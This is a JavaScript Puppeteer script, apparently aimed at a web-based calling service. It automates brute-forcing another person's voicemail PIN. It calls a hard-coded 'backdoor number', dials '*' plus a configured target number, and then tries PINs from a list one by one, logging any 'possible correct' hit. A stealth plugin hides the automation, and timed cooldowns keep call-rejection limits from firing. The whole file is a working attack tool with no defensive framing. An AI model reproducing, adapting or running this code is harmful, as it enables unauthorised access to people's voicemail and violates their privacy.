import puppeteer from 'puppeteer-extra';
import StealthPlugin from 'puppeteer-extra-plugin-stealth';
puppeteer.use(StealthPlugin());

import { evaluateMicrophone, evaluateCallButton, evaluateCallConnection, evaluateConsole  }  from "./evaluate.js";
import { logAttempt } from "./logutil.js";
import { constructDialerKeypad } from "./dialer.js";

async function makeCall(page, configs) {
  await page.waitForTimeout(3500);
  await evaluateCallButton(page, configs);

  await page.click("#newCall", {delay: 300});
  await page.waitForSelector("#newCallRecipients", {timeout: 10000});
  await page.type("#newCallRecipients", "8056377243", {delay: 200});
  await page.waitForTimeout(2000);
  await page.click("#callButton", {delay: 2000});
  await page.waitForSelector("#show-dialer");
  await page.click("#show-dialer");  
}

async function newCall(page, configs) {
  await page.waitForTimeout(3500);
  await evaluateCallButton(page, configs);
  console.log("ATTEMPTING CALL TO BACKDOOR NUMBER");

  try {
    const startCall = await page.waitForSelector("#start-call.start-conversation .tooltip"); 
    const startCallText = await startCall.evaluate(el => el.textContent);
    
    if ((startCallText.trim()) === ("Call (805) 637-7243")) {
      await page.click("#start-call");
      await page.waitForSelector("#show-dialer");
      await page.click("#show-dialer");
    } else {
      await makeCall(page, configs);
    }

  } catch(err) {
    if (err instanceof puppeteer.pptr.errors.TimeoutError) {
      await makeCall(page, configs); 
    } else {
      throw new Error(err);
    }
  }
}

async function waitForCallConnection(page, configs) {
  let {connectionCount} = configs;

  if (!connectionCount) {
      throw new Error("EXCEEDED MAX NO. OF CONNECTION ATTEMPTS: INCREASE COOLDOWN PERIODS");
  }
  
  try {
      await page.waitForFunction(`document.querySelector(".incall-status").innerText.includes("In call")`, {timeout: 10000});
      await page.waitForTimeout(3000); //CHECKS CONNECTION AFTER 3 SECONDS

      const InCallStatus = await page.evaluate(() => { //CHECK IF YOU ARE STILL IN CALL
          return document.querySelector(".incall-status").innerText.includes("In call");
      })

      if (!InCallStatus) {
          throw new Error("CALL REJECTED");
      } else {
        console.log("CALL CONNECTED");
      }

  } catch(err) {
      if (err instanceof puppeteer.pptr.errors.TimeoutError) {
          await evaluateCallConnection(page, configs);
          Object.assign(configs, {connectionCount: connectionCount - 1});
          
          await waitForCallConnection(page, configs);
      } else {
          console.log("POSSIBLE CALL REJECTION RECEIVED: WAIT AT LEAST 15 MINUTES BEFORE RUNNING PROGRAM AGAIN");
          throw new Error(err);
      }
  }
}

async function enterNumber(page, configs) {
  const dialer = await constructDialerKeypad(page);

  let {targetNumber} = configs;
  let dtmfArray = [];
  await evaluateConsole(page, "dtmf", {dtmf: dtmfArray});

  await page.waitForTimeout(5000);
  await dialer["*"].click({ delay: 300});
  await page.waitForTimeout(5000);
  console.log(`ENTERING TARGET NUMBER: ${targetNumber}`);
  
  for (const key of targetNumber) { //Loop works better than promise.all for this scenario
    await dialer[key].click({ delay: 650 });
  }

  await page.waitForTimeout(7000);
  await evaluateConsole(page, "off", {});

  if (!((dtmfArray.join('')) === ('*' + targetNumber))) {
    console.log("NUMBER DIALED DID NOT MATCH TARGET NUMBER: RETRYING CALL");
    await retryCall(page, 5000, configs);
    await waitForCallConnection(page, configs);
    await enterNumber(page, configs);
  }
}

async function enterPin(page, pin, configs) {
  const dialer = await constructDialerKeypad(page);

  let dtmfArray = [];
  await evaluateConsole(page, "dtmf", {dtmf: dtmfArray});

  console.log(`ATTEMPTING PIN: ${pin}`);

  for (const key of pin) {
    await dialer[key].click({ delay: 500});
  }
  
  await page.waitForTimeout(1000);
  await dialer["#"].click({ delay: 300 });
  await page.waitForTimeout(5000);
  
  await evaluateConsole(page, "off", {});

  if (!((dtmfArray.join('')) === (pin + '#'))) {
    console.log("PIN DIALED DID NOT MATCH PIN ATTEMPT: RETRYING CALL");
    await retryCall(page, 5000, configs);
    await waitForCallConnection(page, configs);
    await enterNumber(page, configs);
    await enterPin(page, pin, configs);
  }
}

async function checkPin(page, pin, configs) {
  let stateObj = {
    condition: false,
  }
  
  await evaluateConsole(page, "callEnd", {state: stateObj});

  console.log("EVALUATING PIN");
  await page.keyboard.type("#####################", {delay: 650});
  
  await evaluateConsole(page, "off", {});

  try {
      await page.waitForSelector('.key[data-key="#"]', {timeout: 1500});
      await page.click('.key[data-key="#"]', {delay: 300});
      console.log(`INCORRECT PIN: ${pin}`);
      await logAttempt(pin, configs, "INCORRECT");
  } catch(err) {
      if (err instanceof puppeteer.pptr.errors.TimeoutError && stateObj.condition) {
        console.log(`POSSIBLE CORRECT PIN ${pin}`);
        await logAttempt(pin, configs, "POSSIBLE CORRECT");
        
        return true;

      } else {
        throw new Error(err);
      }
  }
  
  return false;
}

async function endCall(page) {
  await page.waitForTimeout(1000);
  await page.click("#show-dialer");
  await page.click("#start-call > button > img", {delay: 500});
}

async function closeDialogContainer(page) {
  try {
      await page.waitForSelector("#tnDialogContainer", {timeout: 3000});
      await page.click('button[class="buttons secondary skip"]', {delay: 2000});
  } catch(err) {
      if (err instanceof puppeteer.pptr.errors.TimeoutError) {
        return;
      } else {
        throw new Error(err);
      }
  }
}

async function cooldownPeriod(page, configs, count) {
  const {cooldown, cooldownDuration} = configs;
  if (count % cooldown === 0) {
      console.log(`COOLDOWN PERIOD REACHED: WAITING ${Math.ceil(cooldownDuration / 60000)} MINUTES BEFORE NEXT ATTEMPT`);
      await page.waitForTimeout(cooldownDuration);
  }
}

export async function retryCall(page, duration, configs) {
  await endCall(page);
  await closeDialogContainer(page);
  await page.waitForTimeout(duration);
  await newCall(page, configs);
}

export async function attemptProcess(configs, pins, browser, page) { 
  let count = 1;

  await evaluateMicrophone(page);
  
  console.log("IGNORE THIS CALL ATTEMPT: SETTING CONTEXT UP");
  await makeCall(page, configs);
  await endCall(page);
  await closeDialogContainer(page);

  for (const pin of pins) {
    console.log(`----------------------- ATTEMPT: ${count} -----------------------`);
    
    await newCall(page, configs);
    await waitForCallConnection(page, configs);
    await enterNumber(page, configs);
    await enterPin(page, pin, configs);
    
    const result = await checkPin(page, pin, configs);
    if (result) {
      break;
    }

    await endCall(page);
    await closeDialogContainer(page);
    await cooldownPeriod(page, configs, count);
    
    count += 1;
  }
  
  await browser.close();
}